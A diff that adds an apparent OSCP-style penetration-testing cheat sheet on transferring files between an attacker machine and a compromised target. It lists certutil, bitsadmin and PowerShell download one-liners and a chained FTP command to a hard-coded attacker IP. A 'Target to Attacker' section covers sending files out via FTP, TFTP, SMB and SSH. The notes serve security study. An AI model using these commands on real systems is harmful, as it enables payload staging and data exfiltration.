@@ -1,0 +1,149 @@
+https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html#section-8-transferring-files-to-your-target
+https://blog.ropnop.com/transferring-files-from-kali-to-windows/
+https://awakened1712.github.io/oscp/oscp-transfer-files/
+https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples
+
+--------------------
+|Attacker to Target|
+--------------------
+
+HTTP
+----
+Python webserver in directory:
+Python -m SimpleHTTPServer 80
+
+Python version 3.X webserver:
+Python3 -m http.server 80
+
+Start Apache service and put files in web directory to download:
+systemctl start apache2
+netstat -antp | grep apache
+cp file /var/www/html
+
+>Downloading files via HTTP
+Powershell:
+(new-object System.Net.WebClient).DownloadFile('[URL]','[Target Path]')
+
+Certutil:
+certutil.exe -urlcache -split -f "[URL]" [Target Path]
+
+Bitsadmin:
+bitsadmin /transfer myDownloadJob /download /priority normal [URL] [Target Path]
+
+FTP
+---
+Python FTP server with anonymous login:
+Python -m pyftpdlib -p 21 -w
+
+Python 3.X FTP server with anonymous login:
+Python3 -m pyftpdlib -p 21 -w
+
+Install vsftpd to set up FTP Server:
+apt-get install vsftpd
+
+Metasploit auxiliary FTP server:
+use auxiliary/server/ftp
+
+>Downloading files via FTP
+Commandline (Login with anonymous):
+ftp [ip]
+binary
+get [file]
+bye
+
+FTP via injection:
+echo open 10.9.122.8>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo get [file]>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
+
+TFTP
+----
+Use atftpd:
+service atftpd start
+
+Metasploit auxiliary TFTP Server:
+use auxiliary/server/tftp
+
+Enabling TFTP on newer versions of Windows:
+pkgmgr /iu:"TFTP"
+
+>Downloading via TFTP
+tftp -i [ip] GET [file]
+
+SMB
+---
+Use Impacket to set up smb server:
+python smbserver.py [Share Name] [Path to Share]
+
+Confirming smb server is up:
+{Linux}
+smbclient -L [ip] --no-pass
+{Windows}
+net view \\[ip]\[Share Name]
+
+>Downloading via SMB
+dir \\[IP]\[Share Name]
+copy \\[ip]\[Share Name]\[File] .
+
+SSH
+---
+ssh root@[Attacker ip] "cat [file]" > [file]
+
+--------------------
+|Target to Attacker|
+--------------------
+
+FTP
+---
+Python FTP server with anonymous login:
+Python -m pyftpdlib -p 21 -w
+
+Python 3.X FTP server with anonymous login:
+Python3 -m pyftpdlib -p 21 -w
+
+Install vsftpd to set up FTP Server:
+apt-get install vsftpd
+
+Metasploit auxiliary FTP server:
+use auxiliary/server/ftp
+
+>Downloading files via FTP
+Commandline (Login with anonymous):
+ftp [ip]
+binary
+put [file]
+bye
+
+FTP via injection:
+echo open 10.9.122.8>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo put [file]>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
+
+TFTP
+----
+Use atftpd:
+service atftpd start
+
+Metasploit auxiliary TFTP Server:
+use auxiliary/server/tftp
+
+Enabling TFTP on newer versions of Windows:
+pkgmgr /iu:"TFTP"
+
+>Downloading via TFTP
+tftp -i [ip] PUT [file]
+
+SMB
+---
+Use Impacket to set up smb server:
+python smbserver.py [Share Name] [Path to Share]
+
+Confirming smb server is up:
+{Linux}
+smbclient -L [ip] --no-pass
+{Windows}
+net view \\[ip]\[Share Name]
+
+>Downloading via SMB
+dir \\[IP]\[Share Name]
+copy [Local Path] \\[ip]\[Share Name]\
+
+SSH
+---
+ssh root@[Attack ip] "cat > [file]" < [file]
